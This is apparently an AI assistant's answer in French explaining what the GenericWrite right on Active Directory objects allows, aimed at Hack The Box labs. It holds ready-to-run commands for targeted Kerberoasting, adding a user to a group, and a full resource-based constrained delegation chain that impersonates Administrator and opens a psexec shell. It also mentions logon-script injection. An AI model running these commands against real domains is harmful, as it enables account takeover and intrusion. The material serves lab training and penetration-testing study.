`GenericWrite` est proche de `GenericAll` mais avec une nuance importante : tu peux **écrire la plupart des attributs**, mais tu n'as **pas** les droits étendus (extended rights) ni le contrôle de l'ACL/ownership. Concrètement, ça veut dire que certaines actions qui marchent avec `GenericAll` ne marchent **pas** avec `GenericWrite`.

## La distinction clé à retenir

| | GenericAll | GenericWrite |
|---|---|---|
| Écrire un attribut normal (SPN, member, scriptPath...) | ✅ | ✅ |
| Extended rights (ex: `User-Force-Change-Password`) | ✅ | ❌ |
| Modifier l'ACL (WriteDACL) | ✅ | ❌ |
| Changer le propriétaire (WriteOwner) | ✅ | ❌ |

**Donc avec `GenericWrite`, tu ne peux PAS faire un reset de mot de passe direct** (ça nécessite le droit étendu `ForceChangePassword`, séparé). Il faut passer par d'autres attributs exploitables.

## Selon le type d'objet cible

### Cible = User
Deux options principales, puisque le reset de mdp est hors de portée :

**1. Kerberoasting ciblé (ajout de SPN)** — identique à WriteSPN vu plus haut :
```bash
bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<password>' set object <target_user> servicePrincipalName -v 'fake/whatever01'
```

**2. Abus du `scriptPath` (logon script)** — si l'utilisateur cible se connecte sur une machine où le script de login (`\\dc\netlogon\...`) est exécuté, tu peux y injecter une commande qui s'exécute à sa prochaine connexion. Technique plus rare / opportuniste sur HTB, mais existe.

### Cible = Groupe
Ajout direct comme membre — l'attribut `member` reste un attribut normal, donc `GenericWrite` suffit :
```bash
bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<password>' add groupMember <target_group> <user>
```

**Windows (PowerView) :**
```powershell
Add-DomainGroupMember -Identity '<target_group>' -Members '<user>' -Credential $cred
```

### Cible = Computer
C'est le cas le plus courant sur HTB avec `GenericWrite`. L'attribut `msDS-AllowedToActOnBehalfOfOtherIdentity` (utilisé pour RBCD) est un attribut normal, pas un extended right → donc **RBCD reste exploitable** avec `GenericWrite` :

```bash
# Créer un compte machine si besoin
addcomputer.py -computer-name 'EVILPC$' -computer-pass 'Password123!' '<domain>/<user>:<password>'

# Configurer le RBCD
rbcd.py -delegate-from 'EVILPC$' -delegate-to '<target_computer>$' -action write '<domain>/<user>:<password>'

# S4U2Self/S4U2Proxy pour usurper Administrator
getST.py -spn 'cifs/<target_computer>.<domain>' -impersonate Administrator -dc-ip <dc_ip> '<domain>/EVILPC$:Password123!'

export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass <target_computer>.<domain>
```

## Pourquoi cette distinction existe

Microsoft sépare les "extended rights" (actions sensibles comme reset de mdp, DCSync) des "property writes" classiques (modifier un attribut de données). `GenericAll` regroupe tout, `GenericWrite` se limite aux seconds. C'est une distinction importante à repérer en énumération BloodHound — un edge `GenericWrite` ne signifie pas automatiquement "reset password possible".

